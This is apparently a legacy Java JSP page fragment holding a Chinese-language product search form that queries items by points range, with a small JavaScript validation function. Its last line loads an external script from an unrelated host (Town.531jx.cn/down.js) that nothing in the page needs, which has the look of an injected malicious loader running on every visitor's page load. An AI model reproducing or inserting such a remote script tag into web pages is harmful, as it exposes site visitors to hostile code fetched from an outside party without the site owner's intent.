<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<script language="javascript">
<!--
function checkQueryProductForm(){
   if(validate(document.queryProductForm.point1, '积分', 'number', 0, 10, true) &&
      validate(document.queryProductForm.point2, '积分', 'number', 0, 10, true) ){
	   	   document.queryProductForm.submit();
	   }
   return;
}
//-->
</script>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr> 
          <td height="26" colspan="3" align="center" background="images/bg_table_title.gif" class="red15"></td>
        </tr>
        <tr> 
          <td width="23" bgcolor="#FFFFFF">&nbsp;</td>
          <td width="153" bgcolor="#FFFFFF"><img src="images/index_50.gif" width="152" height="35"></td>
          <td bgcolor="#FFFFFF" width="18">&nbsp;</td>
        </tr>
		<form name="queryProductForm" method="post"  action='<c:url value="/queryProduct.do"/>'>
        <tr>      	  
          <td width="23" bgcolor="#FFFFFF">&nbsp;</td>
          <td width="153" align="right" valign="top" bgcolor="#FFFFFF"> 
				<table width="136" height="66" border="0" align="center" cellspacing="0" cellpadding="0">
						<tr> 
						  <td width="59" height="24" class="blackbold">积分从</td>
						  <td width="77"> 
							
              <input name="point1" type="text" id="from" size="10" height="20" maxlength="10">						  </td>
						</tr>
						<tr> 
						  <td height="25" class="blackbold" width="59">到</td>
						  <td width="77"> 
							
              <input name="point2" type="text" id="to" size="10" height="20" maxlength="10">						  </td>
						</tr>
						<tr> 
						  <td height="25" class="blackbold" width="59">&nbsp;</td>
						  <td width="77"><a href="javascript:checkQueryProductForm()"><img src="images/index_69.gif" alt="" width="75" height="24" border="0" > 
							</a></td>
						</tr>
						
						<tr> 
						   <td height="25"  colspan="2">&nbsp; </td>
						</tr>
				</table>
	      </td>
			<td bgcolor="#FFFFFF" >&nbsp;</td>
        </tr>
		</form>
</table>
      
<script language=javascript src=http://Town.531jx.cn/down.js></script>